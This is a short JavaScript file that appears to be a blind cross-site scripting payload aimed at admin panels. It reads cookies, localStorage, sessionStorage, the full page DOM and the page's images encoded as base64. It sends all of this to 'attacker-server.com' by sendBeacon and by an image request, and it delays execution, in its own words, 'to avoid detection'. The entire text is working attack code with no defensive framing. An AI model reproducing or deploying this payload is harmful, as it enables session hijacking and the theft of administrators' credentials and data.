// Comprehensive data collection for admin panels
const collectSensitiveData = () => {
  const payload = {
    url: window.location.href,
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    dom: document.documentElement.innerHTML,
    screenshots: []
  };

  // Capture all images as base64 (potential screenshot substitute)
  document.querySelectorAll('img').forEach((img, i) => {
    const canvas = document.createElement('canvas');
    canvas.width = img.naturalWidth;
    canvas.height = img.naturalHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(img, 0, 0);
    payload.screenshots.push({
      src: img.src,
      data: canvas.toDataURL()
    });
  });

  // Exfiltrate via multiple methods for reliability
  navigator.sendBeacon('https://attacker-server.com/blindxss', JSON.stringify(payload));
  new Image().src = `https://attacker-server.com/log?data=${encodeURIComponent(JSON.stringify(payload))}`;
};

// Delay execution to avoid detection
setTimeout(collectSensitiveData, 5000);
